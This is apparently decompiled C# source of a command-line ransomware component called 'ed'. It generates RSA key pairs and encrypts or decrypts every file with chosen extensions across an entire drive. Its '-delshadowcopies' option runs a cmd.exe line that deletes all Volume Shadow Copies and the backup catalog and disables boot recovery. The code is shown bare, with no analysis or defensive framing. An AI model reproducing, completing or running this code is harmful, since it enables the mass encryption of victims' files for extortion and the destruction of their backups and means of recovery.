using System;
using System.Collections.Generic;
using System.IO;
using System.Threading;

namespace ed
{
	internal class Program
	{
		private static void Main(string[] args)
		{
			if (args.Length == 0)
			{
				return;
			}
			try
			{
				string text = args[0];
				uint num = <PrivateImplementationDetails>.ComputeStringHash(text);
				if (num <= 2900225736u)
				{
					if (num != 412383504u)
					{
						if (num != 445938742u)
						{
							if (num != 2900225736u)
							{
								goto IL_52B;
							}
							if (!(text == "-genrsa"))
							{
								goto IL_52B;
							}
						}
						else
						{
							if (!(text == "-df"))
							{
								goto IL_52B;
							}
							CryptoFile.Decrypt(args[1], Convert.FromBase64String(args[2]));
							goto IL_52B;
						}
					}
					else
					{
						if (!(text == "-dd"))
						{
							goto IL_52B;
						}
						string text2 = args[1].Replace("\\", "").Replace(":", "").ToLower() + ":\\";
						List<string> list = null;
						try
						{
							list = new List<string>(File.ReadAllLines(text2.Replace(":\\", "") + "_drive.index"));
						}
						catch
						{
							list = null;
						}
						string[] array = args[2].ToLower().Split(new char[]
						{
							','
						});
						string[] directories = ((args.Length == 4) ? "" : args[3]).ToLower().Split(new char[]
						{
							','
						});
						byte[] privateKeyBlob = (args.Length == 4) ? Convert.FromBase64String(args[3]) : Convert.FromBase64String(args[4]);
						FileSearcher fileSearcher = (list == null) ? new FileSearcher(text2) : null;
						List<CryptoQueue> list2 = new List<CryptoQueue>();
						List<string> files = FileSearcher.ExcludeDirectories((fileSearcher == null) ? list : fileSearcher.Files, directories);
						string[] array2 = array;
						for (int i = 0; i < array2.Length; i++)
						{
							string extension = array2[i];
							list2.Add(new CryptoQueue(FileSearcher.GetFilesByExtension(files, extension)));
						}
						GC.Collect();
						using (List<CryptoQueue>.Enumerator enumerator = list2.GetEnumerator())
						{
							while (enumerator.MoveNext())
							{
								enumerator.Current.BeginDecryption(privateKeyBlob);
							}
						}
						bool flag = false;
						while (!flag)
						{
							flag = true;
							using (List<CryptoQueue>.Enumerator enumerator = list2.GetEnumerator())
							{
								while (enumerator.MoveNext())
								{
									if (!enumerator.Current.IsDone)
									{
										flag = false;
									}
								}
							}
							Thread.Sleep(1000);
						}
						goto IL_52B;
					}
				}
				else if (num <= 3720286260u)
				{
					if (num != 3125856692u)
					{
						if (num != 3720286260u)
						{
							goto IL_52B;
						}
						if (!(text == "-index"))
						{
							goto IL_52B;
						}
						string text2 = args[1].Replace("\\", "").Replace(":", "").ToLower() + ":\\";
						FileSearcher fileSearcher = new FileSearcher(text2);
						try
						{
							File.WriteAllLines(text2.Replace(":\\", "") + "_drive.index", fileSearcher.Files.ToArray());
							goto IL_52B;
						}
						catch
						{
							goto IL_52B;
						}
					}
					else
					{
						if (!(text == "-delshadowcopies"))
						{
							goto IL_52B;
						}
						PS.ExecuteAndForget("cmd.exe", "/c vssadmin delete shadows /all /quiet & wmic shadowcopy delete & bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no & wbadmin delete catalog –quiet");
						goto IL_52B;
					}
				}
				else if (num != 4237724563u)
				{
					if (num != 4271279801u)
					{
						goto IL_52B;
					}
					if (!(text == "-ed"))
					{
						goto IL_52B;
					}
					string text2 = args[1].Replace("\\", "").Replace(":", "").ToLower() + ":\\";
					List<string> list = null;
					try
					{
						list = new List<string>(File.ReadAllLines(text2.Replace(":\\", "") + "_drive.index"));
					}
					catch
					{
						list = null;
					}
					string[] array = args[2].ToLower().Split(new char[]
					{
						','
					});
					string[] directories = ((args.Length == 4) ? "" : args[3]).ToLower().Split(new char[]
					{
						','
					});
					byte[] publicKeyBlob = (args.Length == 4) ? Convert.FromBase64String(args[3]) : Convert.FromBase64String(args[4]);
					FileSearcher fileSearcher = (list == null) ? new FileSearcher(text2) : null;
					List<CryptoQueue> list2 = new List<CryptoQueue>();
					List<string> files = FileSearcher.ExcludeDirectories((fileSearcher == null) ? list : fileSearcher.Files, directories);
					string[] array2 = array;
					for (int i = 0; i < array2.Length; i++)
					{
						string extension2 = array2[i];
						list2.Add(new CryptoQueue(FileSearcher.GetFilesByExtension(files, extension2)));
					}
					GC.Collect();
					using (List<CryptoQueue>.Enumerator enumerator = list2.GetEnumerator())
					{
						while (enumerator.MoveNext())
						{
							enumerator.Current.BeginEncryption(publicKeyBlob);
						}
					}
					bool flag = false;
					while (!flag)
					{
						flag = true;
						using (List<CryptoQueue>.Enumerator enumerator = list2.GetEnumerator())
						{
							while (enumerator.MoveNext())
							{
								if (!enumerator.Current.IsDone)
								{
									flag = false;
								}
							}
						}
						Thread.Sleep(1000);
					}
					goto IL_52B;
				}
				else
				{
					if (!(text == "-ef"))
					{
						goto IL_52B;
					}
					CryptoFile.Encrypt(args[1], Convert.FromBase64String(args[2]));
					goto IL_52B;
				}
				RSAKeyPair expr_187 = new RSAKeyPair();
				string arg = Convert.ToBase64String(expr_187.PublicKey, Base64FormattingOptions.None);
				string arg2 = Convert.ToBase64String(expr_187.PrivateKey, Base64FormattingOptions.None);
				Console.Write(string.Format("{0},{1}", arg2, arg));
				expr_187.ClearPrivateKey();
				IL_52B:
				if (File.Exists("handle.exe"))
				{
					File.Delete("handle.exe");
				}
			}
			catch
			{
			}
		}
	}
}
